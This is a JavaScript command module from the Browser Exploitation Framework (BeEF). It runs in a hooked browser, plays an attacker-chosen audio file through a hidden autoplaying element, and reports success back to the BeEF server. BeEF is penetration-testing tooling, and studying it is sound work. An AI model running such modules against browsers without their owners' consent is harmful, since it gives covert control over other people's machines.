//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {	

    function playSound(url) {
        function createSound(which) {
            window.soundEmbed = document.createElement("audio");
            window.soundEmbed.setAttribute("src", which);

            window.soundEmbed.setAttribute("style", "display: none;");
            window.soundEmbed.setAttribute("autoplay", true);

        }
        if (!window.soundEmbed) {
            createSound(url);
        }
        else {
            document.body.removeChild(window.soundEmbed);
            window.soundEmbed.removed = true;
            window.soundEmbed = null;
            createSound(url);
        }
        window.soundEmbed.removed = false;
        document.body.appendChild(window.soundEmbed);
    }	
		
	
	
	playSound("<%== @sound_file_uri %>");
	
	beef.net.send("<%= @command_url %>", <%= @command_id %>, "Sound Played");
});
